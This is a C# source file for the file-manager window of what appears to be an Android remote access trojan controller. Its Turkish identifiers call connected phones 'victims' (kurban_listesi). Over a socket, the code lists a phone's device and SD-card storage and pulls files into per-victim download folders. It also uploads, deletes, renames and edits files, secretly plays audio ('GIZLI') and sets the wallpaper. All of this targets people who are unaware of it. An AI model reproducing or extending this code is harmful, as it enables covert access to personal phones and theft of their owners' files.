using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Windows.Forms;
namespace SV
{
    public partial class FİleManager : MetroFramework.Forms.MetroForm
    {
        Socket soketimiz;
        public string ID = "";
        ListViewItem dizin_yukari = new ListViewItem("...");
        ListViewItem dizin_yukari_ = new ListViewItem("...");
        List<ListViewItem> lArray = new List<ListViewItem>();
        List<ListViewItem> lArray_ = new List<ListViewItem>();
        List<string> clipBoard = new List<string>();
        bool cuted = false;
        public FİleManager(Socket s, string aydi)
        {
            InitializeComponent();
            if (!ımageList1.Images.ContainsKey("folder")) { ımageList1.Images.Add("folder", SystemIcons.FolderSmall); }
            metroTabControl1.SelectedIndex = 0;
            soketimiz = s;
            ID = aydi;
            dizin_yukari.ImageKey = "folder";
            dizin_yukari_.ImageKey = "folder";
            dizin_yukari.Tag = "back";
            dizin_yukari_.Tag = "back";
            listView1.MouseClick += listView1_MouseClick;
            listView1.MouseDoubleClick += listView1_MouseDoubleClick;
            listView2.MouseClick += listView2_MouseClick;
            listView2.MouseDoubleClick += listView2_MouseDoubleClick;
            listView1.BackgroundImageLayout = ImageLayout.Zoom;
            listView2.BackgroundImageLayout = ImageLayout.Zoom;

        }
        private void ShowToolTip(string message)
        {
            Invoke((MethodInvoker)delegate {
            new ToolTip().Show(message, this, Cursor.Position.X - Location.X, Cursor.Position.Y - Location.Y, 1000);
            });
        }
        public async void bilgileriIsle(string s1, string s2)
        {
            await System.Threading.Tasks.Task.Run(() =>
            {
                try
                {
                    lArray.Clear(); lArray_.Clear();
                    switch (s1)
                    {
                        case "IKISIDE":
                            listView1.Items.Clear();
                            listView2.Items.Clear();
                            break;
                        case "CIHAZ":
                            listView1.Items.Clear(); //lArray.Clear();
                            break;
                        case "SDCARD":
                            listView2.Items.Clear(); //lArray_.Clear();
                            break;
                    }
                    if (listView1.Items.Contains(dizin_yukari) == false)
                    {
                        listView1.Items.Add(dizin_yukari);
                    }
                    if (listView2.Items.Contains(dizin_yukari_) == false)
                    {
                        listView2.Items.Add(dizin_yukari_);
                    }

                    if (s2 == "BOS")
                    {
                        switch (s1)
                        {
                            case "IKISIDE":
                                ShowToolTip("EMPTY STORAGE.");
                                break;
                            case "CIHAZ":
                                ShowToolTip("THIS FOLDER IS EMPTY.");
                                break;
                            case "SDCARD":
                                ShowToolTip("THIS FOLDER IS EMPTY.");
                                break;

                        }
                    }
                    else
                    {
                        string[] lines = s2.Split('<');
                        for (int o = 0; o < lines.Length; o++)
                        {
                            string[] parse = lines[o].Split('?');
                            try
                            {
                                ListViewItem lv = new ListViewItem(parse[0]);
                                lv.SubItems.Add(parse[1]);
                                lv.SubItems.Add(parse[2].Replace("XX_FOLDER_XX", "Folder"));
                                lv.SubItems.Add(parse[3]);
                                lv.SubItems.Add(parse[4].Replace("CİHAZ", "Device"));
                                if (parse[2] == "XX_FOLDER_XX")
                                {
                                    lv.ImageKey = "folder";
                                    lv.Tag = "folder";
                                }
                                else
                                {

                                    if (string.IsNullOrEmpty(parse[2].ToLower()))
                                    {
                                        parse[2] = ".null";
                                    }
                                    if (!ımageList1.Images.ContainsKey(parse[2].ToLower()))
                                    {
                                        ımageList1.Images.Add(parse[2].ToLower(), FileIcon.GetFileIcon(parse[2].ToLower(), FileIcon.IconSize.SHGFI_SMALLICON));
                                    }
                                    lv.ImageKey = parse[2].ToLower();

                                    switch (parse[2].ToLower())
                                    {
                                        case ".html":
                                        case ".htm":
                                        case ".txt":
                                        case ".js":
                                        case ".cs":
                                        case ".php":
                                        case ".h":
                                        case ".xml":
                                            lv.Tag = "text";
                                            break;
                                        case ".jpeg":
                                        case ".jpg":
                                        case ".png":
                                        case ".gif":
                                            lv.Tag = "image";
                                            break;
                                        case ".mp3":
                                        case ".wav":
                                        case ".ogg":
                                        case ".3gp":
                                        case ".m4a":
                                        case ".aac":
                                        case ".amr":
                                        case ".flac":
                                        case ".ota":
                                            lv.Tag = "music";
                                            break;
                                        default:
                                            lv.Tag = "null";
                                            break;
                                    }
                                }

                                if (parse[4] == "CİHAZ")
                                {
                                    //listView1.Items.Add(lv);
                                    lArray.Add(lv);
                                    textBox1.Text = parse[5];
                                }
                                else
                                {
                                    if (parse[4] == "SDCARD")
                                    {
                                        //listView2.Items.Add(lv);
                                        lArray_.Add(lv);
                                        textBox2.Text = parse[5];
                                    }
                                }

                            }
                            catch (Exception) { }
                            //Application.DoEvents();
                            //System.Threading.Tasks.Task.Delay(1).Wait();
                        }
                        listView1.Items.AddRange(lArray.ToArray());

                        listView2.Items.AddRange(lArray_.ToArray());

                    }
                }
                catch (Exception) { }
            });
            if (textBox1.Text != string.Empty)
                label9.Text = "Current Folder (Device): " + textBox1.Text.Substring(textBox1.Text.LastIndexOf('/') + 1);

            if (textBox2.Text != string.Empty)
                label10.Text = "Current Folder (SD Card): " + textBox2.Text.Substring(textBox2.Text.LastIndexOf('/') + 1);

            label7.Text = "Count SD Card: " + (listView2.Items.Count - 1).ToString();
            label6.Text = "Count Device:   " + (listView1.Items.Count - 1).ToString();
        }
        public void karsiyaYukle(TextBox textBox)
        {
            if (string.IsNullOrEmpty(textBox.Text) == false)
            {
                using (OpenFileDialog op = new OpenFileDialog()
                {
                    Multiselect = true,
                    Filter = "All files|*.*",
                    Title = "Select files to upload.."
                })
                {
                    if (op.ShowDialog() == DialogResult.OK)
                    {
                        try
                        {
                            foreach (string myFilepath in op.FileNames)
                            {
                                if (new FileInfo(myFilepath).Length > 0)
                                {
                                    lock (myFilepath)
                                    {
                                        if (File.Exists(myFilepath))
                                        {
                                            Kurbanlar krbn = ((Form1)Application.OpenForms["Form1"]).kurban_listesi.Where(x => x.id == soketimiz.Handle.ToString()).FirstOrDefault();
                                            if (krbn != null)
                                            {
                                                string check = textBox1.Text + myFilepath.Substring(myFilepath.LastIndexOf(@"\") + 1) + "[ID]" + krbn.identify;
                                                if (((Form1)Application.OpenForms["Form1"]).FindUploadProgressById(check) == null)
                                                {
                                                    FileInfo fi = new FileInfo(myFilepath);
                                                    byte[] icerik = Encoding.UTF8.GetBytes(textBox.Text + "[VERI]" + myFilepath.Substring(myFilepath.LastIndexOf(@"\") + 1) + "[VERI]" + fi.Length.ToString() + "[VERI]" + myFilepath);
                                                    byte[] dataToSend = Form1.MyDataPacker("DOSYABYTE", icerik);
                                                    soketimiz.Send(dataToSend, 0, dataToSend.Length, SocketFlags.None);
                                                    System.Threading.Tasks.Task.Delay(5).Wait();
                                                }
                                                else
                                                {
                                                    //MessageBox.Show("You are already uploading same file to same directory!", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
                                                    ((Form1)Application.OpenForms["Form1"]).FindUploadProgressById(check).TopMost = true;
                                                    ((Form1)Application.OpenForms["Form1"]).FindUploadProgressById(check).TopMost = false;
                                                }
                                            }
                                        }
                                    }
                                }
                                else
                                {
                                    listBox1.Items.Add(DateTime.Now.ToString("HH:mm:ss") +
                                        $" - Don't allow to upload empty file, size is 0 byte => {Path.GetFileName(myFilepath)}");
                                    metroTabControl1.SelectedIndex = 2;
                                }
                                System.Threading.Tasks.Task.Delay(5).Wait();
                            }
                        }
                        catch (Exception) { }
                    }
                }
            }
        }
        public void yenile()
        {
            if (textBox1.Text != "")
            {
                try
                {
                    byte[] senddata = Form1.MyDataPacker("FOLDERFILE", Encoding.UTF8.GetBytes(textBox1.Text));
                    soketimiz.Send(senddata, 0, senddata.Length, SocketFlags.None);
                }
                catch (Exception) { }
            }
        }
        public void yenileSD()
        {
            if (textBox2.Text != "")
            {
                try
                {
                    byte[] senddata = Form1.MyDataPacker("FILESDCARD", Encoding.UTF8.GetBytes(textBox2.Text));
                    soketimiz.Send(senddata, 0, senddata.Length, SocketFlags.None);
                }
                catch (Exception) { }
            }
        }
        private void yenileToolStripMenuItem_Click(object sender, EventArgs e)
        {
            yenile();
        }
        private void listView1_MouseDoubleClick(object sender, MouseEventArgs e)
        {
            if (listView1.SelectedItems.Count == 1)
            {
                Text = Text = "File Manager - " + ((Form1)Application.OpenForms["Form1"]).krbnIsminiBul(soketimiz.Handle.ToString());
                if (listView1.SelectedItems[0].Tag.ToString() == "back")
                {
                    if (textBox1.Text != "/storage/emulated/0")
                    {
                        pictureBox1.Visible = false;
                        listView1.BackgroundImage = null;
                        textBox1.Text = textBox1.Text.Substring(0, textBox1.Text.LastIndexOf("/"));
                        yenile();
                    }
                }
                else if (listView1.SelectedItems[0].Tag.ToString() != "folder")
                {
                    toolStripMenuItem12.PerformClick();
                }
                else
                {
                    if (listView1.SelectedItems[0].Tag.ToString() == "folder")
                    {
                        listView1.BackgroundImage = null;
                        textBox1.Text = listView1.SelectedItems[0].SubItems[1].Text;
                        try
                        {
                            byte[] senddata = Form1.MyDataPacker("FOLDERFILE", Encoding.UTF8.GetBytes(listView1.SelectedItems[0].SubItems[1].Text));
                            soketimiz.Send(senddata, 0, senddata.Length, SocketFlags.None);
                        }
                        catch (Exception) { }
                    }
                }
            }
        }
        private void listView2_MouseDoubleClick(object sender, MouseEventArgs e)
        {
            if (listView2.SelectedItems.Count == 1)
            {
                Text = "File Manager - " + ((Form1)Application.OpenForms["Form1"]).krbnIsminiBul(soketimiz.Handle.ToString());
                if (listView2.SelectedItems[0].Tag.ToString() == "back")
                {
                    if (textBox2.Text.Count(slash => slash == '/') > 2)
                    {
                        listView2.BackgroundImage = null;
                        textBox2.Text = textBox2.Text = textBox2.Text.Substring(0, textBox2.Text.LastIndexOf("/"));
                        yenileSD();
                    }
                }
                else
                {
                    if (listView2.SelectedItems[0].Tag.ToString() == "folder")
                    {
                        listView2.BackgroundImage = null;
                        textBox2.Text = listView2.SelectedItems[0].SubItems[1].Text;
                        try
                        {
                            byte[] senddata = Form1.MyDataPacker("FILESDCARD", Encoding.UTF8.GetBytes(listView2.SelectedItems[0].SubItems[1].Text));
                            soketimiz.Send(senddata, 0, senddata.Length, SocketFlags.None);
                        }
                        catch (Exception) { }
                    }
                }
            }
        }
        private void yükleToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            karsiyaYukle(textBox2);
        }
        private void listView1_MouseClick(object sender, MouseEventArgs e)
        {
            if (listView1.SelectedItems.Count == 1)
            {
                if (listView1.SelectedItems[0].Tag.ToString() == "image")
                {
                    try
                    {
                        byte[] senddata = Form1.MyDataPacker("PRE", Encoding.UTF8.GetBytes(listView1.SelectedItems[0].SubItems[1].Text + "/" + listView1.SelectedItems[0].Text));
                        soketimiz.Send(senddata, 0, senddata.Length, SocketFlags.None);
                    }
                    catch (Exception) { }
                }
                else { pictureBox1.Visible = false; }

                if (listView1.SelectedItems[0].Tag.ToString() != "folder" && listView1.SelectedItems[0].Tag.ToString() != "back")
                {
                    label1.Text = "Name: " + (listView1.SelectedItems[0].Text.Length >= 20 ? listView1.SelectedItems[0].Text.Substring(0, 18) + ".." : listView1.SelectedItems[0].Text);
                    label2.Text = "Path: " + (listView1.SelectedItems[0].SubItems[1].Text.Length >= 20 ? listView1.SelectedItems[0].SubItems[1].Text.Substring(0, 18) + ".." : listView1.SelectedItems[0].SubItems[1].Text);
                    label3.Text = "Size: " + listView1.SelectedItems[0].SubItems[3].Text;
                    label4.Text = "Extension: " + listView1.SelectedItems[0].SubItems[2].Text;
                    label5.Text = "Location: " + listView1.SelectedItems[0].SubItems[4].Text;
                    return;
                }
                label1.Text = "Name:";
                label2.Text = "Path:";
                label3.Text = "Size:";
                label4.Text = "Extension:";
                label5.Text = "Location:";
            }
        }

        private void listView2_MouseClick(object sender, MouseEventArgs e)
        {
            if (listView2.SelectedItems.Count == 1)
            {
                if (listView2.SelectedItems[0].Tag.ToString() == "image")
                {
                    try
                    {
                        byte[] senddata = Form1.MyDataPacker("PRE", Encoding.UTF8.GetBytes(listView2.SelectedItems[0].SubItems[1].Text));
                        soketimiz.Send(senddata, 0, senddata.Length, SocketFlags.None);
                    }
                    catch (Exception) { }
                }
                else { pictureBox1.Visible = false; }
                if (listView2.SelectedItems[0].Tag.ToString() != "folder" && listView2.SelectedItems[0].Tag.ToString() != "back")
                {
                    label1.Text = "Name: " + (listView2.SelectedItems[0].Text.Length >= 20 ? listView2.SelectedItems[0].Text.Substring(0, 18) + ".." : listView2.SelectedItems[0].Text);
                    label2.Text = "Path: " + (listView2.SelectedItems[0].SubItems[1].Text.Length >= 20 ? listView2.SelectedItems[0].SubItems[1].Text.Substring(0, 18) + ".." : listView2.SelectedItems[0].SubItems[1].Text);
                    label3.Text = "Size: " + listView2.SelectedItems[0].SubItems[3].Text;
                    label4.Text = "Extension: " + listView2.SelectedItems[0].SubItems[2].Text;
                    label5.Text = "Location: " + listView2.SelectedItems[0].SubItems[4].Text;
                    return;
                }
                label1.Text = "Name:";
                label2.Text = "Path:";
                label3.Text = "Size:";
                label4.Text = "Extension:";
                label5.Text = "Location:";
            }
        }
        private void FİleManager_Load(object sender, EventArgs e)
        {
            listView1.BringToFront();
        }

        private void denemeToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count > 0)
            {
                foreach (ListViewItem down in listView1.SelectedItems)
                {
                    if (down.Tag.ToString() != "back" && down.Tag.ToString() != "folder")
                    {
                        if (down.SubItems[3].Text != "0 B")
                        {
                            try
                            {
                                Kurbanlar ident = ((Form1)Application.OpenForms["Form1"]).kurban_listesi.Where(x => x.id == soketimiz.Handle.ToString()).FirstOrDefault();
                                if (ident != null)
                                {
                                    string id = down.Text + "|" + Environment.CurrentDirectory + "\\Store\\Downloads\\" + ident.identify;
                                    if (((Form1)Application.OpenForms["Form1"]).FindYuzdeById(id) == null)
                                    {
                                        byte[] senddata = Form1.MyDataPacker("INDIR", Encoding.UTF8.GetBytes(down.SubItems[1].Text + "/" + down.Text));
                                        soketimiz.Send(senddata, 0, senddata.Length, SocketFlags.None);
                                    }
                                    else
                                    {
                                        //MessageBox.Show("You are already downloading same file in same directory!", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
                                        ((Form1)Application.OpenForms["Form1"]).FindYuzdeById(id).TopMost = true;
                                        ((Form1)Application.OpenForms["Form1"]).FindYuzdeById(id).TopMost = false;
                                    }
                                    System.Threading.Tasks.Task.Delay(5).Wait();
                                }
                            }
                            catch (Exception) { }
                        }
                        else
                        {
                            listBox1.Items.Add(DateTime.Now.ToString("HH:mm:ss") +
                                $" - Don't allow to download empty file, size is 0 byte => {down.Text}");
                            //metroTabControl1.SelectedIndex = 2;
                        }
                    }

                }
            }
        }

        private void uploadToolStripMenuItem_Click(object sender, EventArgs e)
        {
            karsiyaYukle(textBox1);
        }

        private void openToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count > 0)
            {
                foreach (ListViewItem lv in listView1.SelectedItems)
                {
                    if (lv.Tag.ToString() != "folder" && lv.Tag.ToString() != "back")
                    {
                        try
                        {
                            byte[] senddata = Form1.MyDataPacker("DOSYAAC", Encoding.UTF8.GetBytes(lv.SubItems[1].Text + "/" + lv.Text));
                            soketimiz.Send(senddata, 0, senddata.Length, SocketFlags.None);
                        }
                        catch (Exception) { }
                    }
                    System.Threading.Tasks.Task.Delay(5).Wait();
                }
            }
        }

        private void refreshToolStripMenuItem_Click(object sender, EventArgs e)
        {
            listView1.BackgroundImage = null;
            yenile();
        }

        private void startToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count == 1)
            {
                if (listView1.SelectedItems[0].Tag.ToString() != "back" && listView1.SelectedItems[0].Tag.ToString() != "folder")
                {

                    if (listView1.SelectedItems[0].Tag.ToString() == "music")
                    {
                        try
                        {
                            byte[] senddata = Form1.MyDataPacker("GIZLI", Encoding.UTF8.GetBytes(listView1.SelectedItems[0].SubItems[1].Text + "/" + listView1.SelectedItems[0].Text));
                            soketimiz.Send(senddata, 0, senddata.Length, SocketFlags.None);
                        }
                        catch (Exception) { }

                    }

                }
            }
        }

        private void stopToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            try
            {
                byte[] senddata = Form1.MyDataPacker("GIZKAPA", Encoding.UTF8.GetBytes("ECHO"));
                soketimiz.Send(senddata, 0, senddata.Length, SocketFlags.None);
            }
            catch (Exception) { }
        }

        private void toolStripMenuItem1_Click(object sender, EventArgs e)
        {
            if (listView2.SelectedItems.Count > 0)
            {
                foreach (ListViewItem down in listView2.SelectedItems)
                {
                    if (down.Tag.ToString() != "back" && down.Tag.ToString() != "folder")
                    {
                        if (down.SubItems[3].Text != "0 B")
                        {
                            try
                            {
                                Kurbanlar ident = ((Form1)Application.OpenForms["Form1"]).kurban_listesi.Where(x => x.id == soketimiz.Handle.ToString()).FirstOrDefault();
                                if (ident != null)
                                {
                                    string id = down.Text + "|" + Environment.CurrentDirectory + "\\Store\\Downloads\\" + ident.identify;
                                    if (((Form1)Application.OpenForms["Form1"]).FindYuzdeById(id) == null)
                                    {
                                        byte[] senddata = Form1.MyDataPacker("INDIR", Encoding.UTF8.GetBytes(down.SubItems[1].Text));
                                        soketimiz.Send(senddata, 0, senddata.Length, SocketFlags.None);
                                    }
                                    else
                                    {
                                        //MessageBox.Show("You are already downloading same file in same directory!", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
                                        ((Form1)Application.OpenForms["Form1"]).FindYuzdeById(id).TopMost = true;
                                        ((Form1)Application.OpenForms["Form1"]).FindYuzdeById(id).TopMost = false;
                                    }
                                    System.Threading.Tasks.Task.Delay(5).Wait();
                                }
                            }
                            catch (Exception) { }
                        }
                        else
                        {
                            listBox1.Items.Add(DateTime.Now.ToString("HH:mm:ss") +
                                $" - Don't allow to download empty file, size is 0 byte => {down.Text}");
                            //metroTabControl1.SelectedIndex = 2;
                        }
                    }

                }
            }
        }

        private void toolStripMenuItem3_Click(object sender, EventArgs e)
        {
            if (listView2.SelectedItems.Count > 0)
            {
                foreach (ListViewItem viewItem in listView2.SelectedItems)
                {
                    if (viewItem.Tag.ToString() != "back" && viewItem.Tag.ToString() != "folder")
                    {
                        try
                        {
                            byte[] senddata = Form1.MyDataPacker("DOSYAAC", Encoding.UTF8.GetBytes(viewItem.SubItems[1].Text));
                            soketimiz.Send(senddata, 0, senddata.Length, SocketFlags.None);
                        }
                        catch (Exception) { }
                    }
                    System.Threading.Tasks.Task.Delay(5).Wait();
                }
            }
        }

        private void toolStripMenuItem4_Click(object sender, EventArgs e)
        {
            yenileSD();
        }

        private void toolStripMenuItem5_Click(object sender, EventArgs e)
        {
            /*
             * WE CAN'T DELETE FILE IN SDCARD BECAUSE OF SECURITY POLICY OF AOSP.
            if (listView2.SelectedItems[0].ImageIndex != 0 && listView2.SelectedItems[0].ImageIndex != 13)
            {
                try
                {
                    byte[] senddata = Form1.MyDataPacker("DELETE", Encoding.UTF8.GetBytes(listView2.SelectedItems[0].SubItems[1].Text));
                    soketimiz.Send(senddata, 0, senddata.Length, SocketFlags.None);
                }
                catch (Exception) { }
            }
            */
        }

        private void toolStripMenuItem7_Click(object sender, EventArgs e)
        {
            if (listView2.SelectedItems.Count == 1)
            {
                if (listView2.SelectedItems[0].Tag.ToString() != "back" && listView2.SelectedItems[0].Tag.ToString() != "folder")
                {
                    try
                    {
                        if (listView2.SelectedItems[0].Tag.ToString() == "music")
                        {
                            byte[] senddata = Form1.MyDataPacker("GIZLI", Encoding.UTF8.GetBytes(listView2.SelectedItems[0].SubItems[1].Text));
                            soketimiz.Send(senddata, 0, senddata.Length, SocketFlags.None);
                        }
                    }
                    catch (Exception) { }
                }
            }
        }

        private void toolStripMenuItem8_Click(object sender, EventArgs e)
        {
            try
            {
                byte[] senddata = Form1.MyDataPacker("GIZKAPA", Encoding.UTF8.GetBytes("ECHO"));
                soketimiz.Send(senddata, 0, senddata.Length, SocketFlags.None);
            }
            catch (Exception) { }
        }

        private async void deleteToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count > 0)
            {
                if (MessageBox.Show("Selected (" + listView1.SelectedItems.Count.ToString() + ") files will be deleted, are you sure?"
                    , "Warning", MessageBoxButtons.YesNo, MessageBoxIcon.Question) == DialogResult.Yes)
                {
                    foreach (ListViewItem selected in listView1.SelectedItems)
                    {
                        if (selected.Tag.ToString() != "back")
                        {
                            string type_ = selected.Tag.ToString() == "folder" ? "folder" : "file";
                            try
                            {
                                byte[] senddata = Form1.MyDataPacker("DELETE", Encoding.UTF8.GetBytes(selected.SubItems[1].Text + "/" + selected.Text + $"[VERI]{type_}"));
                                soketimiz.Send(senddata, 0, senddata.Length, SocketFlags.None);
                                selected.Remove();
                            }
                            catch (Exception) { }
                        }
                        await System.Threading.Tasks.Task.Delay(5);
                    }
                }
            }
        }

        private void toolStripMenuItem9_Click(object sender, EventArgs e)
        {
            cuted = true;
            clipBoard.Clear();
            foreach (ListViewItem cut in listView1.SelectedItems)
            {
                if (cut.Tag.ToString() != "back")
                {
                    try
                    {
                        if (cut.Tag.ToString() != "folder")
                        {
                            clipBoard.Add(cut.SubItems[1].Text + "/" + cut.Text + "[PROPERTY]FILE");
                        }
                        else
                        {
                            clipBoard.Add(cut.SubItems[1].Text + "[PROPERTY]FOLDER");
                        }
                        cut.Remove();
                    }
                    catch (Exception) { }
                }
            }
        }

        private void toolStripMenuItem11_Click(object sender, EventArgs e)
        {
            foreach (string file in clipBoard)
            {
                try
                {
                    string data = file + "[VERI]" + textBox1.Text + $"/{file.Substring(file.LastIndexOf("/") + 1).Split(new string[] { "[PROPERTY]" }, StringSplitOptions.None)[0]}" + "[VERI]" + cuted.ToString();
                    byte[] senddata = Form1.MyDataPacker("PASTE", Encoding.UTF8.GetBytes(data));
                    soketimiz.Send(senddata, 0, senddata.Length, SocketFlags.None);
                }
                catch (Exception) { }
                System.Threading.Tasks.Task.Delay(5).Wait();
            }

            if (clipBoard.Count > 0)
            {
                System.Threading.Tasks.Task.Delay(10).Wait();
                refreshToolStripMenuItem.PerformClick();
            }
            cuted = false;
            clipBoard.Clear();
        }

        private void toolStripMenuItem10_Click(object sender, EventArgs e)
        {
            cuted = false;
            clipBoard.Clear();
            foreach (ListViewItem cut in listView1.SelectedItems)
            {
                if (cut.Tag.ToString() != "back")
                {
                    try
                    {
                        if (cut.Tag.ToString() != "folder") // FILE DELETE'DE FOLDER VE FILE AYRIMI YAP.
                        {
                            clipBoard.Add(cut.SubItems[1].Text + "/" + cut.Text + "[PROPERTY]FILE");
                        }
                        else
                        {
                            clipBoard.Add(cut.SubItems[1].Text + "[PROPERTY]FOLDER");
                        }
                    }
                    catch (Exception) { }
                }
            }
        }

        private void toolStripMenuItem12_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count > 0)
            {
                foreach (ListViewItem lvi in listView1.SelectedItems)
                {
                    if (lvi.Tag.ToString() != "back" && lvi.Tag.ToString() != "folder")
                    {

                        if (lvi.Tag.ToString() == "text")
                        {
                            try
                            {
                                byte[] senddata = Form1.MyDataPacker("EDIT", Encoding.UTF8.GetBytes(lvi.SubItems[1].Text + "/" + lvi.Text));
                                soketimiz.Send(senddata, 0, senddata.Length, SocketFlags.None);
                            }
                            catch (Exception) { }

                        }
                    }
                    System.Threading.Tasks.Task.Delay(5).Wait();
                }
            }
        }

        private void toolStripMenuItem13_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count == 1)
            {
                if (listView1.SelectedItems[0].Tag.ToString() != "back")
                {
                    bool isf = listView1.SelectedItems[0].Tag.ToString() == "folder" ? true : false;
                    new Rename(soketimiz, listView1.SelectedItems[0].Text, listView1.SelectedItems[0].SubItems[1].Text + "/" + listView1.SelectedItems[0].Text, isf)
                        .Show();
                }
            }
        }

        private void toolStripMenuItem14_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count == 1)
            {
                foreach (ListViewItem lvi in listView1.SelectedItems)
                {
                    if (lvi.Tag.ToString() != "back" && lvi.Tag.ToString() != "folder")
                    {

                        if (lvi.Tag.ToString() == "image")
                        {
                            try
                            {
                                byte[] senddata = Form1.MyDataPacker("SETWALLPAPER", Encoding.UTF8.GetBytes(lvi.SubItems[1].Text + "/" + lvi.Text));
                                soketimiz.Send(senddata, 0, senddata.Length, SocketFlags.None);
                            }
                            catch (Exception) { }

                        }
                    }
                }
            }
        }

        private void toolStripMenuItem16_Click(object sender, EventArgs e)
        {
            if (listView2.SelectedItems.Count == 1)
            {
                foreach (ListViewItem lvi in listView2.SelectedItems)
                {
                    if (lvi.Tag.ToString() != "back" && lvi.Tag.ToString() != "folder")
                    {

                        if (lvi.Tag.ToString() == "image")
                        {
                            try
                            {
                                byte[] senddata = Form1.MyDataPacker("SETWALLPAPER", Encoding.UTF8.GetBytes(lvi.SubItems[1].Text));
                                soketimiz.Send(senddata, 0, senddata.Length, SocketFlags.None);
                            }
                            catch (Exception) { }
                        }
                    }
                }
            }
        }

        private void toolStripTextBox1_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Enter)
            {
                try
                {
                    byte[] senddata = Form1.MyDataPacker("NEWFILE", Encoding.UTF8.GetBytes(textBox1.Text + "/" + toolStripTextBox1.Text));
                    soketimiz.Send(senddata, 0, senddata.Length, SocketFlags.None);
                }
                catch (Exception) { }
                metroContextMenu1.Close();
            }
        }

        private void toolStripMenuItem15_Click(object sender, EventArgs e)
        {
            Kurbanlar krbn = ((Form1)Application.OpenForms["Form1"]).kurban_listesi.Where(x => x.id == soketimiz.Handle.ToString()).FirstOrDefault();
            if (krbn != null)
            {
                if (Directory.Exists(Environment.CurrentDirectory + "\\Store\\Downloads\\" +
                    krbn.identify))
                {
                    System.Diagnostics.Process.Start(Environment.CurrentDirectory + "\\Store\\Downloads\\" +
                        krbn.identify);
                }
            }
            else
            {
                System.Diagnostics.Process.Start(Environment.CurrentDirectory + "\\Store\\Downloads\\");
            }
        }

        private void listView1_SelectedIndexChanged(object sender, EventArgs e)
        {
            label8.Text = "Selected Items: " + listView1.SelectedItems.Count.ToString();
            if(listView1.SelectedItems.Count <= 0)
            {
                label1.Text = "Name:";
                label2.Text = "Path:";
                label3.Text = "Size:";
                label4.Text = "Extension:";
                label5.Text = "Location:";
            }
        }

        private void listView2_SelectedIndexChanged(object sender, EventArgs e)
        {
            label8.Text = "Selected Items: " + listView2.SelectedItems.Count.ToString();
            if (listView2.SelectedItems.Count <= 0)
            {
                label1.Text = "Name:";
                label2.Text = "Path:";
                label3.Text = "Size:";
                label4.Text = "Extension:";
                label5.Text = "Location:";
            }
        }

        private void openDownloadsFolderToolStripMenuItem_Click(object sender, EventArgs e)
        {
            metroContextMenu1.Items["toolStripMenuItem15"].PerformClick();
        }
    }
}

//  DOSYA YÖNETİCİSİ İKONLARINI AYARLA VE YAPILACAKLAR.TXT BELGESİNİ OKU. 
//  CLIENT ILK BAGLANDIĞINDA GELEN BILGILERI AYRINTILI YAP. & işareti koy ver&api ve ekran durumuna göre status ayarla.